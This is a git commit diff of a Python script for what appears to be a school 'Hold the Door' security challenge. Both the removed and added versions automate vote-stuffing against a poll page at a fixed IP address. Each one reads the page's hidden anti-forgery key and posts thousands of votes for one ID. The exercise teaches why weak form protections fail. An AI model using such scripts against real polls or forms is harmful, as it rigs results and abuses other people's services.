92ff9f6ddb00d30be31f45c39959d00e384eb265
Nomfutheko <thekothandiwe@gmail.com>
2022-06-06 15:30:17 +0200

    Update 1.py

--- level_1/1.py
+++ level_1/1.py
@@ -1,52 +1,22 @@
 #!/usr/bin/python3
-"""Hodor 1
-   Use: ./1.py
-   The program obtain #votes current and just sending the necessary votes.
-"""
+"""Hodor with my Holberton ID 4096 times."""
 import requests
+from bs4 import BeautifulSoup
 
+php = "http://158.69.76.135/level1.php"
+vote = {
+    "id": "4492",
+    "holdthedoor": "holdthedoor"
+}
 
-try:
-    ID = int(input("Input number the ID: "))
-except ValueError:
-    print("PLEASE: input number integer.")
-    exit(98)
-try:
-    votes = int(input("Input number the votes: "))
-except ValueError:
-    print("PLEASE: input number integer.")
-    exit(98)
+if __name__ == "__main__":
+    for i in range(0, 4096):
+        session = requests.session()
+        page = session.get(php)
+        soup = BeautifulSoup(page.text, "html.parser")
 
-url = 'http://158.69.76.135/level1.php'
-response = requests.get(url)
-key = response.cookies['HoldTheDoor']
-data = {'id': ID, 'holdthedoor': 'Submit', 'key': key}
-success = 'Hold the Door challenge - Level 1'
-ok = 0
-fail = 0
-cookie = {"HoldTheDoor": key}
-votescurrent = 0
-txt = response.text.split()
-txtid = txt.index(str(ID))
-if ((txt[txtid+3]).isdigit()):
-    votescurrent = int(txt[txtid+3])
+        hidden_value = soup.find("form", {"method": "post"})
+        hidden_value = hidden_value.find("input", {"type": "hidden"})
+        vote["key"] = hidden_value["value"]
 
-print("------------------------------------------------------------------")
-print("Hello Alzheimeer: ID: {}, VOTES CURRENT: {}, URL: {},  KEY: {}\
-".format(ID, votescurrent, url, key))
-print("------------------------------------------------------------------")
-print(success)
-print("------------------------------------------------------------------")
-
-for i in range(votescurrent, votes):
-    response1 = requests.post(url, data, cookies=cookie)
-    if response1.status_code is 200 and success in response1.text:
-        ok += 1
-        print("{} Ok ".format(ok), end='\r', flush=True)
-    else:
-        fail += 1
-        print("{} Fail".format(fail), end='\r', flush=True)
-
-print()
-print("------------------------------------------------------------------")
-print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
+        session.post(php, data=vote)
